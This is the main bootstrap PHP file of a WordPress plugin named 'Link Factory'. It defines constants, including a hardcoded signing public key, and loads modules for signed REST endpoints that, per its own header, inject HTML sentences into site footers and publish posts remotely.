<?php
/**
 * Plugin Name: Link Factory
 * Description: Sentence publisher and article publisher — exposes signed REST endpoints that store HTML sentences (rendered in wp_footer, homepage-only or sitewide) and publish standard WordPress posts via wp_insert_post().
 * Version: f909c58
 * Author: Link Factory
 * License: GPL-2.0-or-later
 * Requires at least: 5.8
 * Requires PHP: 7.4
 *
 * @package LinkFactory
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

define( 'LINK_FACTORY_VERSION', 'f909c58' );
// Protocol 5: GET /articles honours the `fields` query param (omit `content` when not requested)
// and accepts `per_page` alongside the legacy `perPage`.
define( 'LINK_FACTORY_PROTOCOL_VERSION', 5 );
define( 'LINK_FACTORY_TABLE', 'link_factory_sentences' );
define( 'LINK_FACTORY_NAMESPACE', 'link-factory/v1' );
define( 'LINK_FACTORY_SIGNATURE_TOLERANCE_SECONDS', 300 );
define( 'LINK_FACTORY_TRUSTED_PUBLIC_KEY', 'nJBIBuWPRNn+M1ijYSHXcglIiYDNA084+kqgHEtgFq0=' );

require_once __DIR__ . '/includes/trait-signature.php';
require_once __DIR__ . '/includes/class-repository.php';
require_once __DIR__ . '/includes/class-health.php';
require_once __DIR__ . '/includes/class-sentences.php';
require_once __DIR__ . '/includes/class-articles.php';
require_once __DIR__ . '/includes/class-users.php';
require_once __DIR__ . '/includes/class-footer.php';
require_once __DIR__ . '/includes/class-plugin.php';

register_activation_hook( __FILE__, array( 'LinkFactory\\Plugin', 'activate' ) );
add_action( 'plugins_loaded', array( 'LinkFactory\\Plugin', 'boot' ) );
